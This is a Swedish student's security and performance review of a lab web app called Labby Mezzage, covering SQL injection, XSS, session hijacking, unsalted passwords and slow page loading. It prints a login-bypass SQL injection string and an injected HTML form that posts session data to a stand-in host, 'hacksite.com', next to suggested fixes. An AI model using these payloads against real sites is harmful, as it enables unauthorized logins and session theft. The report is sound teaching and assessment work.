Hampus Jarleborn - HJ222HI

# Rapport

## Säkerhetsproblem

## SQL Injections

##### Beskrivning

SQL injections är när användaren skickar in egna SQL satser för att komma åt eller förstöra information på sida. Det krävs dock att sidan använder en databas, för annars finns det inget att skicka förfrågningar till.[1]

##### Följder

Som det står i texten över så kan en användare om SQL injections är möjliga komma åt saker som lösenord och annan känslig data, och använda dessa på de sett dom finner bäst. Och det är sällan eller aldrig bra.


#### I Labby Mezzage

I Labby Mezzage finns det möjligheter för att göra SQL injections, tillexempel kan man logga in som senaste inloggade användaren genom att skriva in vilken mail adress som helst som email och sedan skriva 1'or'1'='1 som då gör att det alltid blir true.

##### Förslag på lösning

Lösningen skulle jag säga är att istället för att skriva SQL sataserna som dom är gjorde i Labby Mezzage så bör man parametrisera dom istället för att konkatenera dom.
Man kan också skydda sig mot detta genom att använda storedprocedures och på så viss inte vissa SQL satsen.[1]




## XSS (Cross site scripting)

##### Beskrivning

Cross site scripting eller XSS är när en använadere lyckas stoppa in kod som hen själv har skrivit i din sida. Detta sker allt som oftast genom inputs. Och så kan hen föra in kod som kan ändrar vad sidan kan göra eller hur den ser ut.


#####Följder

XXS kan vara farligt då det gör så "hacker"-användaren kan stjäla information i form av känslig data om antingen andra användaren eller själva utvecklaren. "hacker"användaren kan också ändra vad sidan gör så att den blir obrukbar och på så sätt inte används och då tjänar ju inte utvecklaren några pengar.[2]

##### Förebyggande åtgärder

Det viktiga är att man validerar man ska alltid se till så att man säkrar att det som kommer in till sidan är det man vill att det ska vara och inget annat. Framförallt ska man se till så att man inte kan stoppa in taggar, varken script eller HTML. Man kan också göra en så kallad white-list validation där man kräver vissa tecken och eller längder på det användaren matar in.

#### I Labby Mezzage

I Labby Mezzage kan man inte mata in script taggar, men däremot så kan man mata in HTML och CSS. Detta gör att man kan påverka sidans utseende. Detta kanske låter harmlöst men man kan till exempel dölja fältet där man matar in meddelandet och sedan göra ett eget, som inte bara skickar ett meddelande till sidans server utan som också skickar vidare användarens sessionID och uppgifter. Det ända man hade behövt göra är att skriva detta i meddelande rutan

    <form action="hacksite.com/HackTheTHing.php">
      E-post:

     <input type="text" name="epost" value="exampel@ex.com">
     <br>
     Message:
    <input type="text" name="message" value="">
     <br><br>
     <input type="submit" value="Submit">
    </form>


##### Förslag på lösning

Som jag skrev ovan så borde man valdiera bättre och på så viss inte låta taggar hamna på sidan. ## Session Hijacking

##### Beskrivning

Session Hijacking är när en "hacker"-användare stjäler en annan användares session, detta kan tillexempel görs genom att man lurar dom att klicka på en länk som i det dolda skickar vidare information om deras session och eller cookie till "hacker"-användaren. Denne kan sedan mata in session/cookie IDet i sin egen sesson och på så sätt ta över den andra användarens inlogging. [3]

##### Förebyggande åtgärder

Först och främst så kan måste man precis som med XSS validera allt väldigt noga. Det är också viktigt att man förstör sessionen när användaren loggar ut för då så loggas även "hacker"-användaren ut.

#### I Labby Mezzage
I Labby Mezzage kan man med hjälp av XSS stjäla användarens sessions föratt sedan användadet för att logga in.

##### Förslag på lösning

Som jag skrev ovan om XSS så behövd det valideras mera. Sen så behöver man förstöra sessionen när användaren loggas ut så att även "hacker"-användaren loggas ut.


## Brist på salt

##### Beskrivning

Brist på salt kan göra maten smaklös. Nä men skämt och sido, om man inte haschar eller krypterar lösenord så sparas dom i klartext i databasen vilket gör att alla som har tillgång till den ser dom, både utvekclare och eventuella hackers. [4]


##### Förebyggande åtgärder

Att alltid se till att hascha alla lösenord så att dom inte sparas i klartext i databasen

#### I Labby Mezzage

vid inloggining så krypteras eller haschas lösenordet. Detta ser man om man kollar i /lib/login.js där vakren hasch eller salt används för att de kryptera lösenordet

##### Förslag på lösning

Är att tillexempel använda ett salt som man defingerar och sedan kör lösenordet igenom. [4]


## Prestandaproblem


## Session Hijacking

##### Beskrivning

##### Förebyggande åtgärder

#### I Labby Mezzage

##### Förslag på lösning





Det finns både inline scripts och inline css detta gör att sidan blir långsammare att ladda. Hade allt legat i en fil så hade det gått mycekt snabbare att läsa in. Nu måste webläsaren gå igenom hela sidan och rendera olika saker om varandra och det tycker inte webläsaren om. Man går också en bättre structur om man delar upp olika saker i oliak filer beroedne på innehåll.

Appliaktionen läser på alla sidor in två filer som heter MessageBoard.js och Message.js dessa används dock inte på alla sidor och detta gör att sidan skickar flemeddelanden. Detta gör att sidan skickar HTTP request ionödan vilket gör att sidan blir långsammare.

Det finns även javascriptfiler som laddas in i headern, så borde det inte göras. Dom borde laddas in i botten så att alla HTML renderas innan javascripten laddas. Sidan hade också blivit snabbare om javascriptfilerna var minifierade för då hade det helt enklet varit mindre kod att läsa in. Ett bra verktyg för detta är http://jscompress.com/ där kopierar man in sin kod och så renderar dom om den till en fil med bara en rad.

## Mina Egna övergripande reflektioner

Denna uppgiften har varit väldigt rolig, det är ju lite av en pojkdröm att kunna hacka. Det har också varit väldigt givande att prova då det skapat en större förståelse för hur lätt det är att bryta igenom dålig kod. En sak som gör mig lite nervös var att jag tycket det var svårt att hitta prestanda problem. Och det känns som att jag bara har pekat ut dom självklar och jag misstänker att det finns fler. Men jag har läst på vilekt gjorde att jag hittade lite till och jag tror att jag kommer bli en bättre kdoare om jag fortsätter läsa på.

### Källor

[1] OWASP foundation, "Top 10 2013-A1-Injection", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A1-Injection [Hämtad: 1 december, 2015].

[2] OWASP foundation, "Top 10 2013-A3-Cross-Site Scripting", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS) [Hämtad: 1 december, 2015].
[3] OWASP foundation, "Top 10 2013-A2-Broken Authentication and Session Management", 23 Juni 2013 [Online] Tillgänglig: https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management [Hämtad: 3 december, 2015].

[4] wikibooks, "Lösenordshantering - MD5 och salt", 19 februari 2010 [Online] Tillgänglig: https://sv.wikibooks.org/wiki/L%C3%B6senordshantering_-_MD5_och_salt [Hämtad: 4 december, 2015].
